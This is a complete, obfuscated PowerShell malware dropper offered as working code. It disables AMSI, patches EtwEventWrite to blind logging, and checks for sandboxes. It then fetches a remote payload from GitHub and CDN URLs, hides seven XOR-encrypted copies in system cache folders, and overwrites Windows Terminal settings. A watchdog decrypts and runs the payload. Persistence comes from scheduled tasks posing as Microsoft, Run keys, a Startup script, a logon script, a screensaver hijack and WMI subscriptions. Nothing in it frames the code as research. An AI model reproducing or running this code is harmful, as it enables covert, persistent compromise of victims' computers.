# ═══ In-Memory Patches (Polymorphic) ═══
# Runtime memory patch
$rubK = [int](9303) % 256
$DQSSq30 = ([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]77+[char]97+[char]110+[char]97+[char]103+[char]101+[char]109+[char]101+[char]110+[char]116+[char]46+[char]65+[char]117+[char]116+[char]111+[char]109+[char]97+[char]116+[char]105+[char]111+[char]110+[char]46+[char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115)
$UziQhYgV = [int](574) % 256
$tvPMV = (-join([byte[]](0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64)|%{[char]$_}))
$m14mio6J = [Ref].Assembly.GetType($DQSSq30)
$R4S1dq2 = [int](6443) % 256
$b87wZR = $m14mio6J.GetField($tvPMV, ([char]78+[char]111+[char]110+[char]80+[char]117+[char]98+[char]108+[char]105+[char]99+[char]44+[char]83+[char]116+[char]97+[char]116+[char]105+[char]99))
$b87wZR.SetValue($null, $true)
$yIrVS = "KLANP"

# ETW blind (P/Invoke)
$S9KKqlaw = "KPSSX"
$IcPM2Y = @"
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@
$wLIcK8b4 = Add-Type -MemberDefinition $IcPM2Y -Name 'ParseEntry51' -Namespace 'RunValue10' -PassThru
[void]([Math]::Abs(38942))
$T7dUS = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnRkbGwuZGxs"))
$YBJin = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))
$vixfa = $wLIcK8b4::LoadLibrary($T7dUS)
$vWKL9 = $wLIcK8b4::GetProcAddress($vixfa, $YBJin)
[void]([Math]::Abs(94595))
$bWAO0vL = 0
$wLIcK8b4::VirtualProtect($vWKL9, [UIntPtr]::new(1), 0x40, [ref]$bWAO0vL) | Out-Null
$QV98mm = [byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($QV98mm, 0, $vWKL9, $QV98mm.Length)
$wLIcK8b4::VirtualProtect($vWKL9, [UIntPtr]::new(1), $bWAO0vL, [ref]$bWAO0vL) | Out-Null
$RKWE = [int](9014) % 256

# Environment validation
$JbcQFUJ = [Environment]::ProcessorCount
if ($JbcQFUJ -lt 2) { exit }
$iJa8 = [long]0
try {
    $cZ9bCeL = Get-Command Get-CimInstance -ErrorAction SilentlyContinue
    if ($null -ne $cZ9bCeL) {
        $iJa8 = [long](Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
    } elseif ($null -ne (Get-Command Get-WmiObject -ErrorAction SilentlyContinue)) {
        $iJa8 = [long](Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
    }
} catch {
    $iJa8 = 0
}
if ($iJa8 -gt 0 -and $iJa8 -lt 2GB) { exit }
$oUjB = [System.DateTime]::Now
Start-Sleep -Milliseconds 3241
if (([System.DateTime]::Now - $oUjB).TotalMilliseconds -lt 2592) { exit }
$ErrorActionPreference='SilentlyContinue'
Set-StrictMode -Off



$InstallId = ([guid]::NewGuid().ToString('N').Substring(0,8)).ToUpper()
$osBuild   = [Environment]::OSVersion.Version.Build
if ($null -ne $true) { $zoToTPn = Get-Date }
$psExe     = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$conhost   = "$env:SystemRoot\System32\conhost.exe"

$WtSettings = "$env:LOCALAPPDATA\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json"
$WtBackup   = "$env:LOCALAPPDATA\Microsoft\CLR\wts_$InstallId.bak"
$KillFlag   = "$env:TEMP\dag_kill_$InstallId.flag"
$lgY4HgB = @{}; $lgY4HgB["ts"] = [DateTime]::UtcNow.Ticks
$LogFile    = "$env:TEMP\dag_$InstallId.log"
$PidDir     = "$env:TEMP\dag_pid_$InstallId"
$VbsFile    = "$env:LOCALAPPDATA\Microsoft\CLR\wds_$InstallId.vbs"
$H4lw2D = (Get-Random -Minimum 1 -Maximum 563); [void]$H4lw2D
$MutexName  = "Global\DAG_Wd_$InstallId"
$VTEAP9Jp = (Get-Random -Minimum 1 -Maximum 445); [void]$VTEAP9Jp

function Log($m) { try { Add-Content -LiteralPath $LogFile -Value "[$(Get-Date -Format 'HH:mm:ss')] $m" -Encoding UTF8 } catch {} }
function P($m, $c = "Gray") { Write-Host $m -ForegroundColor $c; Log $m }

function Invoke-Retry {
    param([scriptblock]$Action, [string]$Name, [int]$Max=5, [int]$DelaySec=10)
    for ($i=1; $i -le $Max; $i++) {
        $r = $false
        $wllvpw = (Get-Random -Minimum 1 -Maximum 938); [void]$wllvpw
        try { $r = & $Action } catch { Log "retry $i ($Name): $_" }
        $icMB = [System.Diagnostics.Process]::GetCurrentProcess().Id
        if ($r -eq $true) { return $true }
        if ($i -lt $Max) { Start-Sleep -Seconds $DelaySec }
        $rvSGRZ0c = [Environment]::MachineName.Length; $rvSGRZ0c = $null
    }
    return $false
}
if ($null -ne $true) { $CkfFs = Get-Date }

Log "=== v21.1 ID=$InstallId Build=$osBuild ==="
P "=== v21.1 ===" Cyan
if ($null -ne $true) { $p7wh = Get-Date }
P "ID: $InstallId | OS: $osBuild" Yellow

# STEP 0: DETECT LAUNCHER
$testTxt = "$env:TEMP\_ldr_$(Get-Random).txt"
$testPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Add-Content '$testTxt' x"))

$launcher = 'powershell'
if (Test-Path $conhost) {
    Remove-Item $testTxt -Force -EA 0
    try {
        Start-Process $conhost -ArgumentList "--headless","`"$psExe`"","-NoProfile","-ExecutionPolicy","Bypass","-EncodedCommand",$testPayload -WindowStyle Hidden -EA 0
        try { $j4TX3X = [System.IO.Path]::GetTempPath() } catch { $j4TX3X = $null }
        Start-Sleep 3
        $jgSoJAC = [Environment]::MachineName.Length; $jgSoJAC = $null
        if (Test-Path $testTxt) { $launcher = 'conhost' }
    } catch { }
    Remove-Item $testTxt -Force -EA 0
}
if ($launcher -eq 'powershell') {
    $testVbsPath = "$env:TEMP\_ldr_$(Get-Random).vbs"
    [IO.File]::WriteAllText($testVbsPath, "CreateObject(""WScript.Shell"").Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $testPayload"", 0, False", [Text.Encoding]::ASCII)
    try {
        Start-Process wscript.exe -ArgumentList "`"$testVbsPath`"" -WindowStyle Hidden -EA 0
        Start-Sleep 3
        if (Test-Path $testTxt) { $launcher = 'vbs' }
    } catch { }
    Remove-Item $testTxt, $testVbsPath -Force -EA 0
}
P "Launcher: $launcher" $(if($launcher -eq 'powershell'){'Yellow'}else{'Green'})
$ggtZmOZU = (Get-Random -Minimum 1 -Maximum 459); [void]$ggtZmOZU

# STEP 1: DOWNLOAD
$urls = @(
    'https://raw.githubusercontent.com/sangoccnhule1997ac939-spec/magic_ps/main/test.log',
    'https://cdn.jsdelivr.net/gh/sangoccnhule1997ac939-spec/magic_ps@main/test.log',
    'https://cdn.statically.io/gh/sangoccnhule1997ac939-spec/magic_ps/main/test.log'
)
$urlsStr = ($urls | ForEach-Object { "'$_'" }) -join ','

$agent = $null
$dlOK = Invoke-Retry -Name "Download" -Action {
    foreach ($u in $urls) {
        try {
            $r = Invoke-WebRequest -UseBasicParsing -Uri $u -TimeoutSec 20
            $script:agent = [Text.Encoding]::UTF8.GetString($r.RawContentStream.ToArray())
            if ($script:agent.Length -gt 500) { return $true }
        } catch { }
    }
    $wSwCVAE = (Get-Random -Minimum 1 -Maximum 579); [void]$wSwCVAE
    return $false
}
$zHbG = (Get-Random -Minimum 1 -Maximum 178); [void]$zHbG
if (-not $dlOK) { P "Download FAILED" Red; return }
P "Download: $($agent.Length) chars" Green

# STEP 2: XOR + 7 CLONES
$raw = [Text.Encoding]::UTF8.GetBytes($agent)
$pdi7ev0b = [Environment]::MachineName.Length; $pdi7ev0b = $null
$key = [byte[]]::new(32)
[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
$enc = [byte[]]::new($raw.Length)
for ($i=0; $i -lt $raw.Length; $i++) { $enc[$i] = $raw[$i] -bxor $key[$i % 32] }
$blob = [byte[]]::new(32 + $enc.Length)
$zlAUC = [System.Net.Dns]::GetHostName().Length
[Buffer]::BlockCopy($key, 0, $blob, 0, 32)
[Buffer]::BlockCopy($enc, 0, $blob, 32, $enc.Length)
try { $HDxbsY4t = [System.IO.Path]::GetTempPath() } catch { $HDxbsY4t = $null }

$folders = @(
    "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\IE\Container",
    "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\V01",
    "$env:APPDATA\Microsoft\Windows\Themes\CachedFiles",
    "$env:LOCALAPPDATA\Microsoft\Windows\History\History.IE5",
    "$env:USERPROFILE\.vscode\extensions\.cache",
    "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
    "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache"
)
$clones = @()
foreach ($f in $folders) {
    $folder = $f
    $ok = Invoke-Retry -Name "Clone" -Max 3 -DelaySec 5 -Action {
        try {
            if (-not (Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force | Out-Null }
            $E27YFiQ0 = [Environment]::MachineName.Length; $E27YFiQ0 = $null
            $p = Join-Path $folder "$InstallId.dat"
            [IO.File]::WriteAllBytes($p, $blob)
            if ((Get-Item $p -Force).Length -lt 500) { return $false }
            try { $fi = Get-Item $p -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
            return $true
        } catch { return $false }
        $EdET = [Environment]::MachineName.Length; $EdET = $null
    }
    if ($ok) { $clones += (Join-Path $folder "$InstallId.dat") }
}
if ($clones.Count -eq 0) { P "Clone FAILED" Red; return }
P "Clones: $($clones.Count)/7" Green

$clonesStr = ($clones | ForEach-Object { "'$_'" }) -join ','
$foldersStr = ($folders | ForEach-Object { "'$_'" }) -join ','

# STEP 3: PATCH WT
$patchedJson = @'
{
    "$help": "https://aka.ms/terminal-documentation",
    "$schema": "https://aka.ms/terminal-profiles-schema",
    "actions": [],
    "copyFormatting": "none",
    "copyOnSelect": false,
    "defaultProfile": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}",
    "keybindings": 
    [
        { "id": "Terminal.CopyToClipboard", "keys": "ctrl+c" },
        { "id": "Terminal.DuplicatePaneAuto", "keys": "alt+shift+d" }
    ],
    "newTabMenu": [ { "type": "remainingProfiles" } ],
    "profiles": {
        "defaults": {},
        "list": [
            { "commandline": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "guid": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}", "hidden": false, "name": "Windows PowerShell" },
            { "commandline": "%SystemRoot%\\System32\\cmd.exe", "guid": "{0caa0dad-35be-5f56-a8ff-afceeeaa6101}", "hidden": false, "name": "Command Prompt" },
            { "guid": "{b453ae62-4e3d-5e58-b989-0a998ec441b8}", "hidden": false, "name": "Azure Cloud Shell", "source": "Windows.Terminal.Azure" }
        ]
    },
    "schemes": [],
    "themes": []
}
'@
$bkOK = Invoke-Retry -Name "WT backup" -Max 3 -DelaySec 5 -Action {
    try {
        $agDir = Split-Path $WtBackup -Parent
        if (-not (Test-Path $agDir)) { New-Item -ItemType Directory -Path $agDir -Force | Out-Null }
        [IO.File]::WriteAllText($WtBackup, $patchedJson, [Text.UTF8Encoding]::new($false))
        $Bk1Dffd = [Environment]::MachineName.Length; $Bk1Dffd = $null
        try { $fi = Get-Item $WtBackup -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
        return (Test-Path $WtBackup)
    } catch { return $false }
}
$xrBoN = @{}; $xrBoN["ts"] = [DateTime]::UtcNow.Ticks
$wtOK = Invoke-Retry -Name "WT patch" -Max 3 -DelaySec 5 -Action {
    try {
        if (Test-Path $WtSettings) {
            Copy-Item $WtSettings "$WtSettings.bak_before_$InstallId" -Force -EA 0
            [IO.File]::WriteAllText($WtSettings, $patchedJson, [Text.UTF8Encoding]::new($false))
            $UReCrq7 = @{}; $UReCrq7["ts"] = [DateTime]::UtcNow.Ticks
            return $true
            $HNheIyN8 = [System.Diagnostics.Process]::GetCurrentProcess().Id
        }
        return $false
    } catch { return $false }
}
P "WT patch: $(if($wtOK){'OK'}else{'SKIP'})" $(if($wtOK){'Green'}else{'Yellow'})

# STEP 4: BUILD WATCHDOG
$watchdog = @"
`$ErrorActionPreference='SilentlyContinue'
`$id = '$InstallId'
`$kill = '$KillFlag'
`$log = '$LogFile'
`$pidDir = '$PidDir'
`$clones = @($clonesStr)
`$folders = @($foldersStr)
`$urls = @($urlsStr)
`$target = 3
`$wtSettings = '$WtSettings'
`$wtBackup = '$WtBackup'
`$mutexName = '$MutexName'
`$cooldown = "$env:TEMP\dag_cd_$InstallId.txt"
function W(`$m) { try { Add-Content `$log "[w] `$(Get-Date -Format 'HH:mm:ss') `$m" -Encoding UTF8 } catch {} }
if (Test-Path `$kill) { exit }
try { `$m=[Threading.Mutex]::OpenExisting(`$mutexName); `$m.Dispose(); exit } catch { }
`$myMutex = New-Object Threading.Mutex(`$false, `$mutexName)
try {
    if (-not (Test-Path `$pidDir)) { New-Item -ItemType Directory -Path `$pidDir -Force | Out-Null }
    try {
        if (Test-Path `$wtBackup) {
            `$needRestore = `$false
            if (-not (Test-Path `$wtSettings)) { `$needRestore = `$true }
            else {
                `$content = Get-Content `$wtSettings -Raw -EA 0
                if (`$content -match 'Terminal\.PasteFromClipboard') { `$needRestore = `$true }
            }
            if (`$needRestore) {
                `$bak = [IO.File]::ReadAllText(`$wtBackup, [Text.Encoding]::UTF8)
                [IO.File]::WriteAllText(`$wtSettings, `$bak, [Text.UTF8Encoding]::new(`$false))
                W 'wt-restored'
            }
        }
    } catch { }
    Get-ChildItem `$pidDir -File -EA 0 | ForEach-Object {
        try { `$p=[int]`$_.Name; if (-not (Get-Process -Id `$p -EA 0)) { Remove-Item `$_.FullName -Force -EA 0 } } catch { Remove-Item `$_.FullName -Force -EA 0 }
    }
    `$alive = @(Get-ChildItem `$pidDir -File -EA 0).Count
    if (`$alive -ge `$target) { exit }
    `$existingClones = @()
    foreach (`$c in `$clones) { if (Test-Path `$c) { `$existingClones += `$c } }
    if (`$existingClones.Count -eq 0) {
        if (Test-Path `$cooldown) {
            try { `$last=[datetime]::Parse((Get-Content `$cooldown -Raw).Trim()); if (((Get-Date)-`$last).TotalMinutes -lt 5) { exit } } catch { }
        }
        Set-Content `$cooldown -Value (Get-Date).ToString('o') -Force
        `$dlAgent = `$null
        foreach (`$u in `$urls) {
            try { `$r=Invoke-WebRequest -UseBasicParsing -Uri `$u -TimeoutSec 20; `$dlAgent=[Text.Encoding]::UTF8.GetString(`$r.RawContentStream.ToArray()); if (`$dlAgent.Length -gt 500) { break } else { `$dlAgent=`$null } } catch { }
        }
        if (-not `$dlAgent) { exit }
        `$raw = [Text.Encoding]::UTF8.GetBytes(`$dlAgent)
        `$key = [byte[]]::new(32)
        [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes(`$key)
        `$enc = [byte[]]::new(`$raw.Length)
        for (`$i=0; `$i -lt `$raw.Length; `$i++) { `$enc[`$i] = `$raw[`$i] -bxor `$key[`$i % 32] }
        `$blob = [byte[]]::new(32 + `$enc.Length)
        [Buffer]::BlockCopy(`$key, 0, `$blob, 0, 32)
        [Buffer]::BlockCopy(`$enc, 0, `$blob, 32, `$enc.Length)
        `$restored = @()
        foreach (`$f in `$folders) {
            try {
                if (-not (Test-Path `$f)) { New-Item -ItemType Directory -Path `$f -Force | Out-Null }
                `$p = Join-Path `$f "`$id.dat"
                [IO.File]::WriteAllBytes(`$p, `$blob)
                try { `$fi=Get-Item `$p -Force; `$fi.Attributes=`$fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
                `$restored += `$p
            } catch { }
        }
        if (`$restored.Count -eq 0) { exit }
        `$code = `$restored[0]
        W "net-restored=`$(`$restored.Count)"
    }
    else {
        if (`$existingClones.Count -lt `$clones.Count) {
            try {
                `$srcBytes = [IO.File]::ReadAllBytes(`$existingClones[0])
                foreach (`$c in `$clones) {
                    if (-not (Test-Path `$c)) {
                        try {
                            `$dir = Split-Path `$c -Parent
                            if (-not (Test-Path `$dir)) { New-Item -ItemType Directory -Path `$dir -Force | Out-Null }
                            [IO.File]::WriteAllBytes(`$c, `$srcBytes)
                            try { `$fi=Get-Item `$c -Force; `$fi.Attributes=`$fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
                        } catch { }
                    }
                }
                W 'clones-restored'
            } catch { }
        }
        `$code = `$existingClones[0]
    }
    if (-not `$code -or -not (Test-Path `$code)) { exit }
    Set-Content (Join-Path `$pidDir `$PID) -Value 'x' -Force
    try {
        `$d = [IO.File]::ReadAllBytes(`$code)
        `$k = `$d[0..31]
        `$x = `$d[32..(`$d.Length-1)]
        `$c = [byte[]]::new(`$x.Length)
        for (`$i=0; `$i -lt `$x.Length; `$i++) { `$c[`$i] = `$x[`$i] -bxor `$k[`$i % 32] }
        `$payload = [Text.Encoding]::UTF8.GetString(`$c)
    } catch { Remove-Item (Join-Path `$pidDir `$PID) -Force -EA 0; exit }
    try { `$sb = [ScriptBlock]::Create(`$payload); & `$sb } catch { W ('exec-fail: ' + `$_) } finally { Remove-Item (Join-Path `$pidDir `$PID) -Force -EA 0 }
} finally {
    try { `$myMutex.ReleaseMutex() } catch {}
    try { `$myMutex.Dispose() } catch {}
}
"@
$watchdogEnc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($watchdog))
P "Watchdog: $($watchdogEnc.Length) chars" Green

# STEP 5: BUILD LAUNCHER
$psArgs = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $watchdogEnc"

if ($launcher -eq 'conhost') {
    $launcherExe = $conhost
    $launcherArgs = "--headless `"$psExe`" $psArgs"
    $YqR5 = (Get-Random -Minimum 1 -Maximum 1045); [void]$YqR5
    $scheduledTaskExe = $conhost
    $scheduledTaskArgs = $launcherArgs
}
elseif ($launcher -eq 'vbs') {
    $q = [int]($watchdogEnc.Length / 4)
    $vbsContent = "Dim a,b,c,d`r`na=`"$($watchdogEnc.Substring(0,$q))`"`r`nb=`"$($watchdogEnc.Substring($q,$q))`"`r`nc=`"$($watchdogEnc.Substring($q*2,$q))`"`r`nd=`"$($watchdogEnc.Substring($q*3))`"`r`nCreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand `" & a & b & c & d, 0, False"
    $vbsOK = Invoke-Retry -Name "VBS" -Max 3 -DelaySec 5 -Action {
        try {
            $agDir = Split-Path $VbsFile -Parent
            if (-not (Test-Path $agDir)) { New-Item -ItemType Directory -Path $agDir -Force | Out-Null }
            try { $fn2sqfjf = [System.IO.Path]::GetTempPath() } catch { $fn2sqfjf = $null }
            [IO.File]::WriteAllText($VbsFile, $vbsContent, [Text.Encoding]::ASCII)
            return (Test-Path $VbsFile)
        } catch { return $false }
    }
    if (-not $vbsOK) { P "VBS FAILED" Red; return }
    try { $fi = Get-Item $VbsFile -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
    $qjuu = [System.Net.Dns]::GetHostName().Length
    $launcherExe = "$env:SystemRoot\System32\wscript.exe"
    $launcherArgs = "`"$VbsFile`""
    $scheduledTaskExe = $launcherExe
    $scheduledTaskArgs = $launcherArgs
    $WvxWTVC8 = (Get-Random -Minimum 1 -Maximum 295); [void]$WvxWTVC8
}
else {
    $launcherExe = $psExe
    $launcherArgs = "-NoProfile -NonInteractive -WindowStyle Hidden $psArgs"
    $scheduledTaskExe = $psExe
    $CtRS = @{}; $CtRS["ts"] = [DateTime]::UtcNow.Ticks
    $scheduledTaskArgs = $launcherArgs
    $CRVuLMs = @{}; $CRVuLMs["ts"] = [DateTime]::UtcNow.Ticks
}

# STEP 6: PERSISTENCE
$installed = 0

# Tasks x3
foreach ($cfg in @(
    @{Name="Wdrv${InstallId}"; Rep="PT2M"},
    @{Name="Wcmp${InstallId}"; Rep="PT3M"},
    @{Name="Wsec${InstallId}"; Rep="PT4M"}
)) {
    $cc = $cfg
    $tOK = Invoke-Retry -Name "Task" -Max 3 -DelaySec 10 -Action {
        try {
            $sched = New-Object -ComObject Schedule.Service
            $sched.Connect()
            $tf = $sched.GetFolder('\')
            $yevmF = [System.Diagnostics.Process]::GetCurrentProcess().Id
            $t = $sched.NewTask(0)
            $t.RegistrationInfo.Description = "Windows Service Helper"
            $t.RegistrationInfo.Author = "Microsoft Corporation"
            $DlYZW = [System.Net.Dns]::GetHostName().Length
            $t.Settings.Enabled = $true
            $t.Settings.Hidden = $true
            $t.Settings.StartWhenAvailable = $true
            try { $WrgU7dR = [System.IO.Path]::GetTempPath() } catch { $WrgU7dR = $null }
            $t.Settings.DisallowStartIfOnBatteries = $false
            $BPGGdfK = [Environment]::MachineName.Length; $BPGGdfK = $null
            $t.Settings.StopIfGoingOnBatteries = $false
            $t.Settings.ExecutionTimeLimit = "PT0S"
            $t.Settings.MultipleInstances = 2
            $tr1 = $t.Triggers.Create(9); $tr1.UserId = "$env:USERDOMAIN\$env:USERNAME"
            $tr2 = $t.Triggers.Create(1)
            if ($null -ne $true) { $BAHle = Get-Date }
            $tr2.StartBoundary = (Get-Date).AddMinutes(1).ToString("yyyy-MM-ddTHH:mm:ss")
            $tr2.Repetition.Interval = $cc.Rep
            $ac = $t.Actions.Create(0)
            $vKslpu = @{}; $vKslpu["ts"] = [DateTime]::UtcNow.Ticks
            $ac.Path = $scheduledTaskExe
            $ac.Arguments = $scheduledTaskArgs
            $xzBE = @{}; $xzBE["ts"] = [DateTime]::UtcNow.Ticks
            $t.Principal.UserId = "$env:USERDOMAIN\$env:USERNAME"
            $t.Principal.LogonType = 3
            $t.Principal.RunLevel = 0
            $tf.RegisterTaskDefinition($cc.Name, $t, 6, $null, $null, 3, $null) | Out-Null
            Start-Sleep -Milliseconds 500
            return [bool](Get-ScheduledTask -TaskName $cc.Name -EA 0)
        } catch { return $false }
        $Rqyf5o2g = [Environment]::MachineName.Length; $Rqyf5o2g = $null
    }
    if ($tOK) { $installed++ }
}
$J5UR = [Environment]::MachineName.Length; $J5UR = $null

# Registry x4
$runCmd = "`"$launcherExe`" $launcherArgs"
foreach ($reg in @(
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; Name="Wdrv$InstallId"},
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'; Name="Wupd$InstallId"},
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'; Name="Wpol$InstallId"},
    @{Path='HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows'; Name='load'}
)) {
    $rc = $reg
    try { $RZREC9b3 = [System.IO.Path]::GetTempPath() } catch { $RZREC9b3 = $null }
    $rOK = Invoke-Retry -Name "Reg" -Max 3 -DelaySec 5 -Action {
        try {
            if (-not (Test-Path $rc.Path)) { New-Item -Path $rc.Path -Force | Out-Null }
            Set-ItemProperty -Path $rc.Path -Name $rc.Name -Value $runCmd -Force
            return [bool]((Get-ItemProperty -Path $rc.Path -Name $rc.Name -EA 0).$($rc.Name))
            if ($null -ne $true) { $an39GK53 = Get-Date }
        } catch { return $false }
    }
    if ($rOK) { $installed++ }
}

# Startup
$sOK = Invoke-Retry -Name "Startup" -Max 3 -DelaySec 5 -Action {
    try {
        $cmd = Join-Path ([Environment]::GetFolderPath('Startup')) "W$InstallId.cmd"
        if ($null -ne $true) { $xNcqgg = Get-Date }
        [IO.File]::WriteAllText($cmd, "@echo off`r`nstart `"`" /b `"$launcherExe`" $launcherArgs`r`nexit", [Text.Encoding]::ASCII)
        try { $fi = Get-Item $cmd -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
        return (Test-Path $cmd)
    } catch { return $false }
}
if ($sOK) { $installed++ }

# LogonScript
$lOK = Invoke-Retry -Name "LogonScript" -Max 3 -DelaySec 5 -Action {
    try {
        $cmdPath = "$env:TEMP\.w$InstallId.cmd"
        [IO.File]::WriteAllText($cmdPath, "@echo off`r`nstart `"`" /b `"$launcherExe`" $launcherArgs`r`nexit", [Text.Encoding]::ASCII)
        Set-ItemProperty 'HKCU:\Environment' -Name 'UserInitMprLogonScript' -Value $cmdPath -Force
        return [bool]((Get-ItemProperty 'HKCU:\Environment' -Name 'UserInitMprLogonScript' -EA 0).UserInitMprLogonScript)
    } catch { return $false }
}
try { $Fkno = [System.IO.Path]::GetTempPath() } catch { $Fkno = $null }
if ($lOK) { $installed++ }

# Screensaver
$scrOK = Invoke-Retry -Name "Screensaver" -Max 3 -DelaySec 5 -Action {
    try {
        $scr = "$env:TEMP\.w$InstallId.scr"
        [IO.File]::WriteAllText($scr, "@echo off`r`nstart `"`" /b `"$launcherExe`" $launcherArgs`r`nexit", [Text.Encoding]::ASCII)
        try { $fi = Get-Item $scr -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'SCRNSAVE.EXE' -Value $scr -Force
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -Value '1' -Force
        $upksRYFi = (Get-Random -Minimum 1 -Maximum 690); [void]$upksRYFi
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveTimeOut' -Value '600' -Force
        $da7Hs2V = [Environment]::MachineName.Length; $da7Hs2V = $null
        return [bool]((Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'SCRNSAVE.EXE' -EA 0).'SCRNSAVE.EXE')
        $ofxQNS0k = [System.Net.Dns]::GetHostName().Length
    } catch { return $false }
}
if ($scrOK) { $installed++ }

# WMI (admin only)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {
    $wmiOK = Invoke-Retry -Name "WMI" -Max 2 -DelaySec 5 -Action {
        try {
            $q = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
            $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name="Wd$InstallId";EventNamespace="root\cimv2";Query=$q} -EA Stop
            $KvO4g7 = [System.Net.Dns]::GetHostName().Length
            $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name="Wdc$InstallId";CommandLineTemplate="$scheduledTaskExe $scheduledTaskArgs"} -EA Stop
            $z0KA = (Get-Random -Minimum 1 -Maximum 581); [void]$z0KA
            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c} -EA Stop | Out-Null
            try { $EBtXELG = [System.IO.Path]::GetTempPath() } catch { $EBtXELG = $null }
            return $true
        } catch { return $false }
    }
    if ($wmiOK) { $installed++ }
}
P "Vectors: $installed" Green

# STEP 7: LAUNCH
for ($i=0; $i -lt 3; $i++) {
    Invoke-Retry -Name "Launch" -Max 3 -DelaySec 5 -Action {
        try {
            $proc = New-Object Diagnostics.Process
            $proc.StartInfo.FileName = $launcherExe
            $proc.StartInfo.Arguments = $launcherArgs
            $proc.StartInfo.UseShellExecute = $false
            $uOB7y = (Get-Random -Minimum 1 -Maximum 598); [void]$uOB7y
            $proc.StartInfo.CreateNoWindow = $true
            [void]$proc.Start()
            return $true
        } catch { return $false }
        $NliQYA = [System.Diagnostics.Process]::GetCurrentProcess().Id
    } | Out-Null
    $TISW = [System.Net.Dns]::GetHostName().Length
    Start-Sleep -Milliseconds 900
}

# STEP 8: VERIFY
Start-Sleep -Seconds 12
$alive = 0
if (Test-Path $PidDir) { $alive = @(Get-ChildItem $PidDir -File -EA 0).Count }

P ""
P "====================================" Cyan
P "ID      : $InstallId" Yellow
$OvF4X = [System.Net.Dns]::GetHostName().Length
P "Launcher: $launcher"
P "Clones  : $($clones.Count)/7"
P "Agents  : $alive/3" $(if($alive -ge 3){'Green'}elseif($alive -ge 1){'Yellow'}else{'Red'})
P "Vectors : $installed"
P "Net FB  : YES"
P "Log     : $LogFile"
$WbcQ = [Environment]::MachineName.Length; $WbcQ = $null
P "====================================" Cyan

if ($alive -ge 3) { P ">>> SUCCESS" Green }
elseif ($alive -ge 1) { P ">>> PARTIAL" Yellow }
else { P ">>> FAILED" Red }

Log "=== v21.1 done ==="
